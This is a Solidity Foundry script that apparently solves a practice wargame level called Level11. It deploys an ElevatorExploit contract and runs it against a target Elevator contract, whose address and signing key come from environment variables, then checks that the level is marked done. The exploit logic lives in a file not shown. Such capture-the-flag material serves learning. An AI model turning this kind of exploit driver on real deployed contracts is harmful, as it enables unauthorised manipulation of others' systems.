pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {Elevator} from "../src/Level11.sol";
import {ElevatorExploit} from "../src/Level11Exploit.sol";

contract Level11Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress);
        vm.stopBroadcast();

        require(levelDone(contractAddress), "Solution failed");
    }

    function exploit(address _target) private {
        ElevatorExploit e = new ElevatorExploit();
        e.exploit(_target);
    }

    function levelDone(address _target) private view returns (bool) {
        return Elevator(_target).top();
    }
}
